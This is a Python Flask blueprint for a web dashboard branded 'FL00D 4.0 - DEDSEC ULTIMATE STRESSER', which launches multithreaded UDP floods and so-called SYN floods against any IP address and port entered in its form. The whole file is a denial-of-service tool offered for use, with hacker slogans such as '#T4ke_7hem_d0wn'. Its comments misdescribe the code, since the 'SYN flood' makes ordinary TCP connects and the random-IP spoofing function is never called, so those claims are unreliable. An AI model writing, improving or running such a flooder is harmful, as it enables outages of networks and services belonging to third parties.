from flask import Blueprint, request, render_template_string
import socket
import random
import threading
import time
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Blueprint Setup
script4_bp = Blueprint('script4', __name__)

# Global Control Variables
attack_running = False
log_messages = ["[*] System Ready. Waiting for target..."]
lock = threading.Lock()  # To prevent race conditions

# --- ATTACK ENGINE FUNCTIONS ---

def get_random_ip():
    """Generates a random spoofed source IP."""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def udp_flood_worker(target_ip, target_port, duration, packet_size, thread_id):
    """
    Performs a high-speed UDP flood with random payload.
    Uses raw socket for speed.
    """
    global attack_running
    
    # Create socket (SOCK_DGRAM for UDP)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Allow broadcast or reuse address to prevent "Address already in use" errors
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Set a small timeout so we can check the 'attack_running' flag periodically
        sock.settimeout(0.5) 
        
        payload = os.urandom(packet_size) # Random binary data
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() < (start_time + duration) and attack_running:
            try:
                # Dynamic Port Logic: If port is 0, pick a random one per packet
                send_port = target_port if target_port != 0 else random.randint(1024, 65535)
                
                # Randomize source port for spoofing effect (optional but powerful)
                sock.bind(('0.0.0.0', random.randint(1024, 65535)))
                
                sock.sendto(payload, (target_ip, send_port))
                sent_count += 1
                
                # Small sleep to prevent CPU hogging on the *server* side if needed, 
                # but for raw socket flood, we keep it tight.
            except Exception:
                pass
        
        sock.close()
        with lock:
            log_messages.append(f"[+] Thread-{thread_id} finished UDP flood: {sent_count} packets sent.")
            
    except Exception as e:
        with lock:
            log_messages.append(f"❌ Thread-{thread_id} Error: {str(e)}")

def syn_flood_worker(target_ip, target_port, duration, thread_id):
    """
    Performs a TCP SYN Flood (Half-Open).
    Connects and immediately closes without completing handshake.
    """
    global attack_running
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(0.5) # Very short timeout for SYN flood
        
        start_time = time.time()
        sent_count = 0
        
        while time.time() < (start_time + duration) and attack_running:
            try:
                # Random source port
                sock.bind(('0.0.0.0', random.randint(1024, 65535)))
                
                # The SYN Packet
                sock.connect_ex((target_ip, target_port))
                sent_count += 1
                
                # Immediately close to leave the connection half-open on the server side
                sock.close() 
            except Exception:
                pass
        
        with lock:
            log_messages.append(f"[+] Thread-{thread_id} finished SYN flood: {sent_count} packets sent.")
            
    except Exception as e:
        with lock:
            log_messages.append(f"❌ SYN Thread-{thread_id} Error: {str(e)}")

# --- FLASK ROUTES ---

@script4_bp.route("/", methods=["GET", "POST"])
def index():
    global attack_running, log_messages
    
    # Reset logs on fresh load (optional)
    if request.method == "GET":
        log_messages = ["[*] System Ready. Waiting for target..."]

    status_msg = ""
    stats_html = ""

    if request.method == "POST":
        action = request.form.get("action")
        
        if action == "START":
            target_ip = request.form.get("ip").strip()
            try:
                target_port = int(request.form.get("port", 80))
                threads_udp = int(request.form.get("threads_udp", 20))
                threads_syn = int(request.form.get("threads_syn", 10)) # New feature: Separate SYN threads
                duration = int(request.form.get("duration", 300)) # Default 5 mins
                packet_size = int(request.form.get("size", 1024))
            except ValueError:
                status_msg = "❌ Invalid Input Numbers!"

            if target_ip:
                with lock:
                    attack_running = True
                
                log_messages.insert(0, f"🚀 [!] ATTACK INITIATED at {datetime.now().strftime('%H:%M:%S')}")
                
                # Prepare Threads for UDP Flood
                udp_threads = []
                for i in range(threads_udp):
                    t = threading.Thread(target=udp_flood_worker, args=(target_ip, target_port, duration, packet_size, i), daemon=True)
                    udp_threads.append(t)
                    t.start()

                # Prepare Threads for SYN Flood (The "Heavy Hitter")
                syn_threads = []
                for i in range(threads_syn):
                    t = threading.Thread(target=syn_flood_worker, args=(target_ip, target_port, duration, f"SYN-{i}"), daemon=True)
                    syn_threads.append(t)
                    t.start()

                status_msg = f"✅ <b>Launched!</b> {threads_udp} UDP Threads + {threads_syn} SYN Threads on {target_ip}:{target_port}"
            else:
                status_msg = "❌ Error: Target IP missing!"

        elif action == "STOP":
            with lock:
                attack_running = False
            log_messages.insert(0, f"🛑 [!] Attack Forcefully Terminated.")
            status_msg = "🛑 <b>Attack Stopped.</b>"

    # Render Log Box
    log_box = "<br>".join([f"<div>{msg}</div>" for msg in log_messages[-20:]]) # Show last 20 logs

    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>FL00D 4.0 - DEDSEC ULTIMATE</title>
    <style>
        body { background: #050505; color: #ff3e3e; font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
        .container { max-width: 800px; margin: auto; border: 2px solid #ff3e3e; background: #111; padding: 20px; box-shadow: 0 0 20px rgba(255, 62, 62, 0.3); }
        h1 { text-align: center; color: #fff; text-shadow: 0 0 10px #ff3e3e; margin-top: 0; }
        .subtitle { text-align: center; color: #888; font-size: 0.9em; margin-bottom: 20px; }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
        label { color: #fff; font-weight: bold; display: block; margin-bottom: 5px; }
        input { width: 100%; background: #000; color: #ff3e3e; border: 1px solid #ff3e3e; padding: 8px; box-sizing: border-box; font-family: inherit; }
        
        .btn-group { text-align: center; margin-top: 20px; display: flex; gap: 10px; justify-content: center; }
        button { 
            padding: 12px 30px; font-weight: bold; cursor: pointer; border: none; font-family: inherit; text-transform: uppercase; transition: 0.3s; 
        }
        .btn-start { background: #ff3e3e; color: #fff; box-shadow: 0 0 10px #ff3e3e; }
        .btn-start:hover { background: #cc0000; }
        .btn-stop { background: #fff; color: #000; box-shadow: 0 0 10px #fff; }
        .btn-stop:hover { background: #ccc; }
        
        .log-box { 
            margin-top: 25px; background: #000; border: 1px solid #333; padding: 15px; height: 200px; overflow-y: auto; 
            font-size: 13px; color: #0f0; border-left: 4px solid #ff3e3e;
        }
        .log-entry { margin-bottom: 4px; border-bottom: 1px dashed #222; padding-bottom: 2px; }
        .blink { animation: blinker 1s linear infinite; color: yellow; }
        
        @keyframes blinker { 50% { opacity: 0.5; } }
        
        .status-msg { 
            background: #222; color: #fff; padding: 10px; border: 1px solid #444; margin-bottom: 15px; text-align: center; font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 FL00D 4.0 - DEDSEC ULTIMATE STRESSER 🔥</h1>
        <p class="subtitle">#T4ke_7hem_d0wn | #AndroSec1337 | #CyberMasterPro</p>
        
        {% if status_msg %}
        <div class="status-msg">{{ status_msg }}</div>
        {% endif %}

        <form method="POST">
            <div class="grid">
                <div>
                    <label>Target IP Address:</label>
                    <input name="ip" placeholder="192.168.1.1 or domain.com" required style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                </div>
                <div>
                    <label>Target Port (0=Random):</label>
                    <input name="port" type="number" value="80" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                </div>
                
                <div>
                    <label>UDP Threads (Volume):</label>
                    <input name="threads_udp" type="number" value="20" max="100" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                </div>
                <div>
                    <label>SYN Threads (Connection Stress):</label>
                    <input name="threads_syn" type="number" value="10" max="50" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                </div>

                <div>
                    <label>Packet Size (Bytes):</label>
                    <input name="size" type="number" value="1250" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                </div>
                <div>
                    <label>Duration (Seconds):</label>
                    <input name="duration" type="number" value="60" style="background:#000; color:#ff3e3e; border:1px solid #ff3e3e; padding:5px;">
                </div>
            </div>

            <div class="btn-group">
                <button name="action" value="START" class="btn-start">🚀 EXECUTE ATTACK</button>
                <button name="action" value="STOP" class="btn-stop">🛑 TERMINATE</button>
            </div>
        </form>

        <div class="log-box">
            <b style="color:#fff; border-bottom: 1px solid #555; display:block; margin-bottom:10px;">[ SYSTEM LOGS ]</b>
            {{ log_box | safe }}
            {% if attack_running %}
            <div class="blink">[!] CURRENTLY FLOODING... PACKETS BEING SENT...</div>
            {% endif %}
        </div>

        <br>
        <div style="text-align:center; margin-top:20px;">
            <a href="/" style="color:#ff3e3e; text-decoration:none; font-weight:bold;">[ REFRESH DASHBOARD ]</a>
        </div>
    </div>
</body>
</html>
""", status_msg=status_msg, log_box=log_box, attack_running=attack_running)
